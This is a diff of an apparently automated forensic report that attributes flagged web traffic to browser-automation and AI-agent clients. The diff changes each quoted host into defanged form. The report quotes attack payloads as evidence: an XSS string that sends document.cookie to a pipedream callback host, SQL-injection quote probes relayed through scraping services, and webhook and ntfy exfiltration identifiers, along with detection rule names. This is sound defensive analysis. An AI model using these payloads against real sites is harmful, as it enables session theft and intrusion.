@@ -70,7 +70,7 @@ Each claim gives its layer, label (Confirmed, Suspected, Possible, Unattributed)
 
 1. browser automation (Mozilla-compatible user agent). Label: Possible; tag: Inference. Traces: 1 record(s) sent User-Agent `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36`; 1 record(s) sent User-Agent `Mozilla/5.0 (compatible; ExaSearchBot/1.0; +hxxps://crawler[.]exa[.]ai/)`; 1 record(s) match header fingerprint rule header.agent_ua; 1 record(s) match header fingerprint rule header.cf_browser_rendering; 1 record(s) match header fingerprint rule header.pentest_ua; 1 record(s) match header fingerprint rule header.ua_platform_mismatch; 1 record(s) send the header-name set 4c117166 (cf-brapi-devtools); 1 record(s) encode URLs in style `sp+.raw.noslash`; 1 record(s) sent User-Agent `Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; ChatGPT-User/1.0; +hxxps://openai[.]com/bot`; 1 record(s) encode URLs in style `dbl.sorted.noslash`; 1 record(s) sent User-Agent `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/141.0 Safari/537.36`; 1 record(s) match header fingerprint rule header.gzip_only_requests; 2 record(s) match header fingerprint rule header.headless_ua; 1 record(s) match header fingerprint rule header.scripted_ua; 1 record(s) match header fingerprint rule header.via_ats; 1 record(s) send the header-name set ef2d658b (accept-encoding, via).
 2. modelcontextprotocol. Label: Possible; tag: Inference. Traces: 1 record(s) sent User-Agent `ModelContextProtocol/1.0 (Autonomous; +hxxps://github[.]com/modelcontextprotocol/servers)`; 1 record(s) match header fingerprint rule header.cf_browser_rendering; 1 record(s) match header fingerprint rule header.mcp_fetch_ua; 1 record(s) send the header-name set 5b6270b3 (cf-brapi-request-id).
-3. nuclei. Label: Possible; tag: Inference. Traces: 1 record(s) sent User-Agent `Nuclei - Open-source project (github.com/projectdiscovery/nuclei)`; 1 record(s) match header fingerprint rule header.agent_ua; 1 record(s) match header fingerprint rule header.cf_browser_rendering; 1 record(s) match header fingerprint rule header.pentest_ua; 1 record(s) match header fingerprint rule header.ua_platform_mismatch; 1 record(s) send the header-name set 4c117166 (cf-brapi-devtools); 1 record(s) encode URLs in style `sp+.raw.noslash`.
+3. nuclei. Label: Possible; tag: Inference. Traces: 1 record(s) sent User-Agent `Nuclei - Open-source project (github[.]com/projectdiscovery/nuclei)`; 1 record(s) match header fingerprint rule header.agent_ua; 1 record(s) match header fingerprint rule header.cf_browser_rendering; 1 record(s) match header fingerprint rule header.pentest_ua; 1 record(s) match header fingerprint rule header.ua_platform_mismatch; 1 record(s) send the header-name set 4c117166 (cf-brapi-devtools); 1 record(s) encode URLs in style `sp+.raw.noslash`.
 4. playwright. Label: Possible; tag: Inference. Traces: 1 record(s) sent User-Agent `Playwright/1.48`; 1 record(s) match header fingerprint rule header.gzip_only_requests; 2 record(s) match header fingerprint rule header.headless_ua; 1 record(s) match header fingerprint rule header.scripted_ua; 1 record(s) match header fingerprint rule header.via_ats; 1 record(s) send the header-name set ef2d658b (accept-encoding, via).
 5. python-httpx. Label: Possible; tag: Inference. Traces: 1 record(s) sent User-Agent `python-httpx/0.27.0`; 1 record(s) match header fingerprint rule header.gzip_only_requests; 2 record(s) match header fingerprint rule header.headless_ua; 1 record(s) match header fingerprint rule header.scripted_ua; 1 record(s) match header fingerprint rule header.via_ats; 1 record(s) send the header-name set ef2d658b (accept-encoding, via).
 
@@ -138,7 +138,7 @@ Every flagged request to each host, including requests outside the linked cluste
   - provenance: unknown 3 · single source
   - scope: scope exceeded · task class account setup; failed: S5 (accounts or credentials were acquired or reused); S6 (data was sent to a callback inbox or side channel)
 - **C4** (significant): 3 records, 2 run(s), 2026-08-06 16:00:00 UTC → 2026-08-07 12:00:00 UTC, median gap 20.0h
-  - linked by: `exfil.requestbin:c0ve7x9.m.pipedream.net`
+  - linked by: `exfil.requestbin:c0ve7x9[.]m[.]pipedream[.]net`
   - provenance: unknown 3 · single source
   - scope: scope exceeded · task class unclear; failed: S4 (attack payloads were sent to a party that did not sanction them); S5 (accounts or credentials were acquired or reused); S6 (data was sent to a callback inbox or side channel)
   - relay stack `carrier.html_program → carrier.inline_fetch_program → target` on 1 records: one client's habit, not evidence on its own
@@ -168,11 +168,11 @@ Every flagged request to each host, including requests outside the linked cluste
   - provenance: unknown 3 · single source
   - scope: scope exceeded · task class data retrieval; failed: S1 (a data retrieval run reached access-controlled or sensitive targets); S2 (the route climbed to reach one target, past a block); S3 (requests reached configuration, source or administration paths)
 - **C10** (suggestive): 2 records, 1 run(s), 2026-08-06 14:00:00 UTC → 2026-08-06 14:00:30 UTC, median gap 30s
-  - linked by: `exfil.webhook_site:webhook.site/deadbeef-0000-4000-8000-00000000c0de`
+  - linked by: `exfil.webhook_site:webhook[.]site/deadbeef-0000-4000-8000-00000000c0de`
   - provenance: unknown 2 · single source
   - scope: scope exceeded · task class unclear; failed: S6 (data was sent to a callback inbox or side channel)
 - **C11** (suggestive): 2 records, 1 run(s), 2026-08-07 09:00:00 UTC → 2026-08-07 09:01:00 UTC, median gap 60s
-  - linked by: `exfil.ntfy:/ntfy.sh/covrun7results`
+  - linked by: `exfil.ntfy:/ntfy[.]sh/covrun7results`
   - provenance: unknown 2 · single source
   - scope: scope exceeded · task class unclear; failed: S6 (data was sent to a callback inbox or side channel)
 - **C12** (suggestive): 2 records, 1 run(s), 2026-08-12 09:00:00 UTC → 2026-08-12 09:05:00 UTC, median gap 5m
@@ -191,7 +191,7 @@ For each cluster, the window to search, what its times measure, and the strings 
 - **C3**: 2026-08-05 10:00:00 UTC to 2026-08-07 13:00:00 UTC, times of unknown kind
   - identifiers: `param:uqtag=covrun7`
 - **C4**: 2026-08-06 16:00:00 UTC to 2026-08-07 12:00:00 UTC, times of unknown kind
-  - identifiers: `exfil.requestbin:c0ve7x9.m.pipedream.net`
+  - identifiers: `exfil.requestbin:c0ve7x9[.]m[.]pipedream[.]net`
 - **C5**: 2026-08-03 09:01:10 UTC to 2026-08-03 09:01:40 UTC, times of unknown kind
 - **C6**: 2026-08-10 09:20:00 UTC to 2026-08-10 09:30:00 UTC, times of unknown kind
 - **C7**: 2026-08-11 09:00:00 UTC to 2026-08-11 09:00:30 UTC, times of unknown kind
@@ -200,9 +200,9 @@ For each cluster, the window to search, what its times measure, and the strings 
 - **C9**: 2026-08-09 09:10:00 UTC to 2026-08-09 11:05:00 UTC, times of unknown kind
   - identifiers: `param:uqtag=covrun9`
 - **C10**: 2026-08-06 14:00:00 UTC to 2026-08-06 14:00:30 UTC, times of unknown kind
-  - identifiers: `exfil.webhook_site:webhook.site/deadbeef-0000-4000-8000-00000000c0de`
+  - identifiers: `exfil.webhook_site:webhook[.]site/deadbeef-0000-4000-8000-00000000c0de`
 - **C11**: 2026-08-07 09:00:00 UTC to 2026-08-07 09:01:00 UTC, times of unknown kind
-  - identifiers: `exfil.ntfy:/ntfy.sh/covrun7results`
+  - identifiers: `exfil.ntfy:/ntfy[.]sh/covrun7results`
 - **C12**: 2026-08-12 09:00:00 UTC to 2026-08-12 09:05:00 UTC, times of unknown kind
 - **C13**: 2026-08-12 09:50:00 UTC to 2026-08-12 09:55:00 UTC, times of unknown kind
 
@@ -211,15 +211,15 @@ For each cluster, the window to search, what its times measure, and the strings 
 
 URLs are defanged. Records are listed by evidence strength.
 
-1. 2026-08-07 12:00:00 UTC: `hxxps://records[.]agency[.]example/search?q=%3Cscript%3Efetch(%27//c0ve7x9.m.pipedream.net/?c=%27%2Bdocument.cookie)%3C/script%3E`
+1. 2026-08-07 12:00:00 UTC: `hxxps://records[.]agency[.]example/search?q=%3Cscript%3Efetch(%27//c0ve7x9[.]m[.]pipedream[.]net/?c=%27%2Bdocument.cookie)%3C/script%3E`
    - rules: carrier.inline_fetch_program, carrier.html_program, exfil.requestbin, exfil.cookie, exploit.xss
-1. 2026-08-13 09:00:00 UTC: `hxxps://app[.]scrapingbee[.]com/api/v1/?api_key=YOUR_API_KEY&url=https%3A%2F%2Frecords.agency.example%2Fitems%3Fid%3D1%2527`
+1. 2026-08-13 09:00:00 UTC: `hxxps://app[.]scrapingbee[.]com/api/v1/?api_key=YOUR_API_KEY&url=https%3A%2F%2Frecords[.]agency[.]example%2Fitems%3Fid%3D1%2527`
    - rules: relay.scrape_api, marker.placeholder, exploit.double_encoded_meta, exploit.sqli_quote
-1. 2026-08-13 09:00:00 UTC: `hxxps://app[.]scrapingbee[.]com/api/v1/?api_key=YOUR_API_KEY&url=https%3A%2F%2Frecords.agency.example%2Fitems%3Fid%3D1%2527&stealth_proxy=true`
+1. 2026-08-13 09:00:00 UTC: `hxxps://app[.]scrapingbee[.]com/api/v1/?api_key=YOUR_API_KEY&url=https%3A%2F%2Frecords[.]agency[.]example%2Fitems%3Fid%3D1%2527&stealth_proxy=true`
    - rules: relay.scrape_api, marker.placeholder, antibot.unblocker_params, exploit.double_encoded_meta, exploit.sqli_quote
 1. 2026-08-11 09:00:00 UTC: `hxxps://demo[.]testfire[.]net/search?query=%3Cscript%3Ealert(1)%3C/script%3E&uqtag=covscope`
    - rules: carrier.html_program, exploit.xss, marker.uq_tags
-1. 2026-08-13 09:00:00 UTC: `hxxps://api[.]allorigins[.]win/raw?url=https%3A%2F%2Frecords.agency.example%2Fitems%3Fid%3D1%2527`
+1. 2026-08-13 09:00:00 UTC: `hxxps://api[.]allorigins[.]win/raw?url=https%3A%2F%2Frecords[.]agency[.]example%2Fitems%3Fid%3D1%2527`
    - rules: relay.allorigins, exploit.double_encoded_meta, exploit.sqli_quote
 1. 2026-08-05 10:00:00 UTC: `hxxps://r[.]jina[.]ai/hxxps://portal[.]agency[.]example/report?part=headers1&uqtag=covrun7`
    - rules: relay.jina, marker.callback_seq, marker.uq_tags
